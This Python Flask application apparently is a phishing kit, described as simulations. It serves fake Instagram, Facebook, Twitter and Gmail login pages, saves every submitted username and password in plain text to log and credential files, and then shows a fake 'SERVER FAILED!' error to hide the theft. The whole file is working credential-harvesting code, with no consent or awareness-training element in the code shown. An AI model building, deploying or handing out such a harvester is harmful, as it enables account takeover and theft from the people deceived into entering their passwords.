from flask import Flask, request, redirect, render_template
import os
from datetime import datetime

# Initialize Flask application with templates folder
app = Flask(__name__, template_folder='templates')

# Ensure that the credentials folder exists
if not os.path.exists("credentials"):
    os.makedirs("credentials")

@app.route('/')
def home():
    """Home page with links to all phishing simulations"""
    return render_template('home.html')  # Render the home page with options

@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    """Instagram phishing simulation"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Log the captured credentials
        log_entry = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Instagram: {username}:{password}"
        print(log_entry)

        # Write log entry to simulations.log
        with open("simulations.log", "a") as log_file:
            log_file.write(log_entry + "\n")

        # Save credentials in a separate file
        with open("credentials/instagram_creds.txt", "a") as f:
            f.write(log_entry + "\n")

        # Redirect to a custom page (not the real Instagram page)
        return redirect("/thank-you")  # Redirect to a custom thank-you page

    return render_template('instagram.html')  # Render the fake Instagram login page

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    """Facebook phishing simulation"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        log_entry = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Facebook: {username}:{password}"
        print(log_entry)

        # Write log entry to simulations.log
        with open("simulations.log", "a") as log_file:
            log_file.write(log_entry + "\n")

        # Save credentials in a separate file
        with open("credentials/facebook_creds.txt", "a") as f:
            f.write(log_entry + "\n")

        return redirect("/thank-you")  # Redirect to a custom thank-you page

    return render_template('facebook.html')  # Render the fake Facebook login page

@app.route('/twitter', methods=['GET', 'POST'])
def twitter():
    """Twitter phishing simulation"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        log_entry = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Twitter: {username}:{password}"
        print(log_entry)

        # Write log entry to simulations.log
        with open("simulations.log", "a") as log_file:
            log_file.write(log_entry + "\n")

        # Save credentials in a separate file
        with open("credentials/twitter_creds.txt", "a") as f:
            f.write(log_entry + "\n")

        return redirect("/thank-you")  # Redirect to a custom thank-you page

    return render_template('twitter.html')  # Render the fake Twitter login page

@app.route('/gmail', methods=['GET', 'POST'])
def gmail():
    """Gmail phishing simulation"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        log_entry = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Gmail: {username}:{password}"
        print(log_entry)

        # Write log entry to simulations.log
        with open("simulations.log", "a") as log_file:
            log_file.write(log_entry + "\n")

        # Save credentials in a separate file
        with open("credentials/gmail_creds.txt", "a") as f:
            f.write(log_entry + "\n")

        return redirect("/thank-you")  # Redirect to a custom thank-you page

    return render_template('gmail.html')  # Render the fake Gmail login page

@app.route('/thank-you')
def thank_you():
    """Thank-you page after successful login simulation"""
    return '''
        <h1>SERVER FAILED!</h1>
        <p>Please try again later.</p>
    '''

if __name__ == '__main__':
    app.run(debug=True, port=5001)  # Using port 5001 to avoid conflicts
